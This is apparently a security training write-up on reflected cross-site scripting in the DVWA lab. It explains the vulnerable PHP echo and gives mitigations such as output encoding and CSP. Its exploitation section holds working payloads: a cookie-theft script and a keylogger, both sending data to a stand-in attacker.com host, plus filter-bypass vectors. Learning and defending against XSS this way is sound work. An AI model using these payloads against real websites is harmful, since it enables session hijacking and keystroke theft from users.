Reflected XSS (Cross-Site Scripting)

🔍 What Is It?


Cross-Site Scripting (XSS) is a client-side injection attack where malicious scripts are injected into web pages and executed in a victim's browser. In Reflected XSS, the payload is embedded in the URL or request, reflected back immediately in the response, and executed — it is not stored on the server.
This is the most common XSS type and is often delivered via phishing links.


⚙️ How It Works in DVWA

DVWA's Reflected XSS module has a simple name input field. The entered value is reflected directly back into the page HTML without sanitization:
php// Vulnerable code
echo '<pre>Hello ' . $_GET['name'] . '</pre>';
If a user enters <script>alert(1)</script>, the page renders:
html<pre>Hello <script>alert(1)</script></pre>
The browser executes the script.


💥 Exploitation


Basic proof-of-concept:
html<script>alert('XSS')</script>

Cookie theft (session hijacking): html<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
Keylogger injection:
html<script> document.onkeypress = function(e) {fetch('http://attacker.com/log?k=' + e.key);}
</script>
Bypassing basic filters (angle bracket encoding):
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
javascript:alert(1)
The attack flow:

Attacker crafts a malicious URL containing the XSS payload
Victim clicks the link (e.g., via phishing email)
DVWA reflects the payload in its response
Victim's browser executes the script in the context of the DVWA domain
Attacker receives cookies/session tokens




🔐 Mitigation


MethodDescriptionOutput EncodingEncode special characters (<, >, ", ', &) before rendering in HTMLContent Security Policy (CSP)HTTP header that restricts which scripts can executeHttpOnly CookiesPrevents JavaScript from accessing session cookiesInput ValidationReject or sanitize inputs containing HTML/JS characters
php// ✅ Safe - HTML encoding
echo '<pre>Hello ' . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . '</pre>';
